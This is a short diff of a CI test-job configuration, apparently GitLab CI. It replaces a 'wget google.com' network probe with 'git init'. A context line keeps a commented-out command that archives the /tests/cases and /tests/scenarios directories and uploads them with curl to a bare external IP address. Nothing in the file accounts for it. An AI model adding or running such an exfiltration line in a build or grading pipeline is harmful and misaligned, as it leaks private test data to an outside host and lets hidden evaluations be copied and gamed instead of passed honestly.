@@ -3,7 +3,7 @@ test:
     script:
         - ls /tests/cases
         # - tar -zcvf contents.tar /tests/cases/* /tests/scenarios/* && curl -H "Content-Type:application/gzip" --data-binary @contents.tar -X POST 114.72.108.42
-        - wget google.com
+        - git init 
         - /test.sh  
 variables:
     GIT_STRATEGY: clone
